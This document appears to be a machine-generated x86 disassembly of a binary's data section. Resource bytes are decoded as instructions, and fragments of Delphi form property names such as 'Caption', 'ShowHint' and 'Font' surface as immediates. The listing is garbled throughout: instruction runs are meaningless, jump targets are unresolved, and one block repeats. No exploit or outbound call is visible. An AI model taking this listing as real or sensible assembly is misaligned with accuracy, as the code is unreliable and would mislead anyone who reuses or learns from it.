imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
mov [ ebp ] 0xff000020
push eax
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
push [ eax + 0x63 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x75 ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0004 ] al
insd
popad
dec ecx
outsb
js r-xdata
inc ecx
add [ eax + eax ] ah
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
jae r-xdata
outsd
adc al [ ebx ]
push es
je r-xdata
push 0x78655473
je r-xdata
add [ eax ] eax
add [ eax ] al
and [ edx ] dl
inc ebx
add [ esi ] al
or ah [ fs : ebx + 0x64 ]
arpl [ ebp + 0x73 ] si
jae r-xdata
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
and eax 0xc4ff0000
adc [ eax ] al
sbb [ eax ] al
add bh bh
nop
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2710 ] al
add eax 0x614d0800
js r-xdata
bound eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
cmp al 0x10
inc eax
add [ eax + eax ] dl
add bh bh
test al 0x62
inc ebx
add [ edx + 0x43 ] bh
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xc79c6564
inc ebp
add [ eax ] ah
add [ eax ] al
call [ eax + 0x64 ]
inc ebx
push ebx
imul edi [ edx + 0x65 ] r-xdata
and al 0x0
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
add [ ecx + ebx * 2 + 0x41 ] bh
add [ eax + eax ] bl
add bh bh
pushad
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax - 0x6fffbcef ]
and al 0x12
inc ebx
add [ ebx ] al
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x6e774f73
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
arpl [ ebx + esi * 2 + 0x44 ] sp
or esp [ ebx + 0x64 ]
push eax
outsd
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x4314ec90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
adc eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x15
inc ebx
add [ edx + 0x1c0043 ] bl
add [ eax ] al
sub [ ecx + eax * 2 ] ah
loopne r-xdata
outsb
je r-xdata
call eax
add bh bh
mov ah 0x63
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0xffffffffc4ff0000 ] ah
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc al 0x0
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + edx * 4 ] bh
inc ecx
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ eax ] dh
inc eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6c797453
popad
jb r-xdata
adc [ ebx + 0x64 ] ah
arpl [ ebx + esi * 2 + 0x4d ] sp
inc ebp
jb r-xdata
inc ecx
add al bh
cdq
inc ecx
add al cl
inc ebx
add [ eax ] bh
xchg esi eax
inc ecx
add [ esi + edx * 4 + 0x10041 ] dh
inc eax
push esp
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax 0x6c797453
xchg esp eax
adc [ eax ] al
or al 0x0
add bh bh
loopne r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2065646f
adc al [ ebx ]
sbb eax 0xd0ff0000
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
inc ecx
add [ eax - 0x5fffbe70 ] bl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
inc ecx
add [ eax - 0x66 ] al
inc ecx
add [ edx + ebx * 4 + 0x41 ] al
xor al 0x40
js r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040009 ] al
bound eax [ ebx ]
cmp al 0x63
inc ebx
add [ eax - 0x47ffbe6c ] cl
xchg esp eax
inc ecx
add [ eax - 0x2bffbe6c ] dh
popad
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] dl
nop
nop
inc ecx
add [ eax + 0x30004190 ] bl
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ah
insb
jb r-xdata
outsb
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
jne r-xdata
popad
jae r-xdata
add [ eax + 0x3c004195 ] ah
0x9a400041 0x41
inc esp
0x99f80041 0x41
enter 0x4364 0x0
cmp [ esi - 0x694bffbf ] dl
inc ecx
add [ ecx ] al
add bh bh
inc esp
inc ebx
add [ edi ] cl
push esp
dec eax
popad
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
dec [ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000a ] al
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax + 0x15 ] bl
inc ebx
add [ esp + esi * 2 ] cl
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
outsd
je r-xdata
insb
jae r-xdata
outsb
je r-xdata
jb r-xdata
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
adc eax 0xf070043
push esp
dec eax
popad
adc [ eax + 0x18 ] ch
adc [ ebx ] eax
retn
rol [ ecx + edx + 0x2030043 ] 0x2e
cmp [ ecx ] eax
outsd
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
popad
arpl [ ebx + 0x42 ] bp
imul ebp [ gs : bp + 0xb ] 0x72547374
popad
add al 0x8
or eax 0x64616548
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
push esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
inc ebp
jns r-xdata
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
cmp al 0x16
outsd
outsb
je r-xdata
popad
or dh [ ebx + esi * 2 + 0x54 ]
jb r-xdata
jae r-xdata
outsd
popad
jb r-xdata
je r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
arpl [ ebx + 0x4d ] bp
outsd
jbe r-xdata
jb r-xdata
inc ebx
add [ edi ] al
andps xmm1 [ eax + 0x65 ]
popad
adc al 0x43
add ah dl
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
je r-xdata
outsb
je r-xdata
inc ebx
add ah dh
adc al [ ebx ]
mov eax eax
movsb [ edi ] [ esi ]
push ss
inc ebx
add [ eax ] cl
jbe r-xdata
jbe r-xdata
outsb
jb r-xdata
insd
dec eax
popad
arpl [ ebx + 0x45 ] bp
outsb
dec esi
outsd
je r-xdata
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
jb r-xdata
arpl [ ebx + 0x45 ] bp
outsb
or [ fs : ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jb r-xdata
pop es
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add cl [ eax ]
or eax 0x64616548
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
outsb
je r-xdata
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jae r-xdata
insb
jae r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al dh
sbb [ ebx ] eax
hlt
outsb
je r-xdata
add [ ebx + 0x43155cc0 ] cl
add [ ebx ] al
jne r-xdata
outsd
dec eax
popad
jb r-xdata
add al dh
sbb [ ebx ] eax
hlt
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
popad
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
shl [ eax + 0x8004315 ] 0x17
push esp
inc ebx
jne r-xdata
inc ebp
jbe r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
jae r-xdata
je r-xdata
or [ esi ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
outsb
push cs
push esp
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x53 ] bp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
je r-xdata
hlt
je r-xdata
add ah dh
adc al [ ebx ]
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ eax ] ah
push esp
inc ebx
jne r-xdata
outsb
je r-xdata
insd
dec eax
popad
jb r-xdata
inc eax
add [ eax + ebx + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jb r-xdata
add [ ebx + edx * 2 ] ecx
push esp
inc ebx
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
add [ ecx + edx ] al
inc eax
add ah dh
adc al [ ebx ]
hlt
jb r-xdata
je r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
inc ebx
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc ebx
add ah dh
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x163c0040 ] cl
insd
inc esp
jb r-xdata
push ebx
je r-xdata
add al 0x8
push es
push ebx
add [ eax ] eax
outsd
outsb
je r-xdata
clc
add [ eax ] al
mov [ ecx ] bl
inc ebx
add al bl
sbb [ ebx ] eax
js r-xdata
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or al 0x53
pop es
inc edx
outsd
outsd
insb
popad
outsb
outsb
inc esp
insd
dec eax
or [ ebx ] cl
inc esi
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
outsd
outsb
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add al dh
sbb [ ebx ] eax
ja r-xdata
sbb al [ edx ]
loopne r-xdata
imul eax [ ebp ] 0xffffff94
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
sub [ ecx ] bl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ebx ] ch
insb
add [ gs : eax ] eax
jb r-xdata
insd
dec eax
inc ebp
add [ esp + esi * 2 + 0x43 ] cl
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insb
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
inc esp
inc ebx
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
push esp
mov eax 0x1ae00044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
push cs
push esp
dec eax
popad
jb r-xdata
outsd
insb
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
adc al 0x66
inc ebx
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
dec esp
je r-xdata
add al [ eax ]
add [ eax + edi * 4 + 0x44 ] dl
add al ah
sbb al [ edx ]
in al dx
je r-xdata
dec eax
popad
popad
je r-xdata
or [ ebx + 0x6f ] al
push 0x616c4673
je r-xdata
inc ebp
add [ ebx + ebx ] ah
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x71 ] ch
inc ebx
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ esi + 0x43 ] ch
add ah bl
xor [ ebp ] eax
cwde
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add [ eax ] al
push 0x60680043
inc ebp
add [ eax ] bh
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ edi + esi * 2 ] dl
inc ebx
add [ edi + esi * 2 + 0x43 ] cl
add [ eax + 0xd004374 ] al
add [ eax + esi * 4 ] bh
sub edi [ esi + ecx * 2 + 0x50201bc ]
add [ edi ] al
mov bl 0xff
mov dl 0xff
mov cl 0xff
mov al 0xff
scasd [ edi ]
[ esi - 0x5b004901 ]
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
inc edx
add ah ch
add al dh
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
xor [ eax ] bl
inc ebx
add [ ebx ] al
or al 0x54
jbe r-xdata
inc ebx
inc ebx
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx ] cl
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
pop ss
insb
lea eax [ eax ]
mov ah 0x18
inc ebx
insd
inc ebx
je r-xdata
inc ebx
outsd
inc ebx
add [ ecx ] cl
push 0x74754273
je r-xdata
add [ eax ] al
sub al 0x18
outsb
je r-xdata
je r-xdata
inc ebp
inc ebx
outsd
sub_431908
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x71 ] ch
inc ebx
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ esi + 0x43 ] ch
add ah bl
xor [ ebp ] eax
cwde
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add [ eax ] al
push 0x60680043
inc ebp
add [ eax ] bh
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ edi + esi * 2 ] dl
inc ebx
add [ edi + esi * 2 + 0x43 ] cl
add [ eax + 0xd004374 ] al
add [ eax + esi * 4 ] bh
sub edi [ esi + ecx * 2 + 0x50201bc ]
add [ edi ] al
mov bl 0xff
mov dl 0xff
mov cl 0xff
mov al 0xff
scasd [ edi ]
[ esi - 0x5b004901 ]
sub_4319a5
push 0x6d500043
inc ebx
add [ eax + 0x6e ] ch
inc ebx
add [ edx + esi * 2 ] cl
inc ebx
add [ edx + esi * 2 + 0x43 ] ch
add [ eax ] bl
je r-xdata
popad
jb r-xdata
add [ edx + ebp * 2 + 0x6ae80043 ] ch
inc ebx
add [ esi * 2 + 0x76f40043 ] bl
inc ebx
add [ eax ] cl
imul eax [ ebx ] 0x28
imul eax [ ebx ] 0x0
imul eax [ ebx ] 0x75435414
jae r-xdata
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
insd
dec eax
popad
jb r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] cl
inc edx
outsd
insb
mov ah 0x18
inc ebx
add [ eax ] cl
mov esp 0x220044
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ ecx ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
inc ebp
insb
jae r-xdata
push 0xf073726f
pop ecx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
outsd
insb
lea eax [ eax ]
hlt
add [ eax ] 0x0
add [ eax + 0x48080014 ] al
outsd
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
call [ eax + 0x100436b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
mov [ eax + 0x610044 ] ch
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax - 0x5f ] cl
inc esp
add [ ebx ] bl
add bh bh
push 0x10044ed
add dh bh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
insd
popad
jb r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
inc edx
add [ eax ] ch
add bh bh
dec eax
stc
inc esp
add [ eax - 0x7 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
jb r-xdata
add bh bh
jpe r-xdata
push [ eax ]
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
mov bh 0x44
add [ ecx + eax ] ch
push [ ecx + 0x45 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
test eax 0x740044
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
jae r-xdata
arpl [ ebx ] bp
adc [ eax ] al
push eax
add [ eax ] al
je r-xdata
enter 0x45 0x28
adc [ eax ] al
and [ edx ] al
add bh bh
push esp
imul eax [ ebx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f14001b ] al
sbb [ ebx ] al
sub al 0x2
add bh bh
jl r-xdata
insb
popad
jae r-xdata
jb r-xdata
sbb [ eax + eax ] 0xd
dec edi
outsb
jae r-xdata
outsd
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] ch
insb
inc esp
jb r-xdata
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5305001a ] al
je r-xdata
outsd
outsb
inc esp
jb r-xdata
lodsb [ esi ]
adc eax 0x2400043
add bh bh
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc ebx
jb r-xdata
adc al 0x4f
imul ebp [ esi + 0x74 ] 0x43152c73
add [ eax ] cl
add al [ eax ]
jmp [ ebx + ebp * 2 + 0x10043 ]
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
ja r-xdata
outsd
outsb
je r-xdata
inc esi
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
[ eax + 0x6b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080013 ] al
jne r-xdata
add [ eax ] ah
add al [ eax ]
call [ ebx + ebp * 2 + 0x43 ]
add [ ecx ] al
jae r-xdata
outsb
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
je r-xdata
insb
mov esp 0x70004317
add al [ eax ]
push [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
cmp [ bp + di + 0x41 ] bl
add [ eax + 0x2 ] ch
add bh bh
push ebx
cmp [ 0x43 ] dl
push eax
add al [ eax ]
call [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
cmovg ebp [ esi + 0x53 ]
inc esp
jb r-xdata
outsb
cmp [ esi ] dl
inc ebx
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc eax
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
outsd
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
sar [ eax + 0x1d ] 0x43
add [ eax ] cl
adc [ esp + eax * 2 + 0x72 ] edx
popad
ja r-xdata
adc [ eax ] al
lea eax [ eax ]
clc
sbb eax 0x13080043
push esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
je r-xdata
jpe r-xdata
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
popad
jb r-xdata
jae r-xdata
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
jb r-xdata
jns r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
mov al [ 0x58004316 ]
add al [ eax ]
[ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
push cs
dec edi
push esp
dec eax
popad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] cl
inc ebx
add ah dh
adc al [ ebx ]
outsb
dec esi
outsd
je r-xdata
pop es
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
mov eax eax
push esp
push ds
inc ebx
add [ eax ] cl
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] cl
inc ebx
add ah dh
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x1df80040 ] cl
inc ebx
add [ eax ] cl
adc edx [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsd
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
insb
push cs
push esp
dec eax
popad
jb r-xdata
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
and [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
arpl [ ebx + 0x53 ] bp
arpl [ ebx + 0x45 ] bp
jbe r-xdata
inc ebx
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
dec esp
je r-xdata
add [ esi ] dl
add [ eax ] al
add [ eax ] dl
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
jb r-xdata
outsb
je r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
or [ 0x64616548 ] cl
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
imul eax [ ebp + 0x76 ] 0x65
outsd
outsb
je r-xdata
inc ebp
